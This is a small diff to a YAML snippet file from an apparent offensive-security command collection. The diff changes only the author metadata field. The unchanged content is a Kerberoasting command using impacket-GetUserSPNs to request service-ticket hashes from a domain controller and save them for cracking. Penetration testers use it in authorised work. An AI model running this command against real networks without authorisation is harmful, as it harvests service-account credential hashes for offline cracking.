@@ -3,7 +3,7 @@ metadata:
   filename: "impacket-GetUserSPNs-kerberoasting.yaml"
   tags: ["domain", "cracking"]
   created: "2025-03-29"
-  author: "Unknown"
+  authors: ["Unknown"]
 
 content: |
   sudo impacket-GetUserSPNs -request -dc-ip <domain-controller-ip> <domain>/<username>:<password> -outputfile hashes.kerberoast
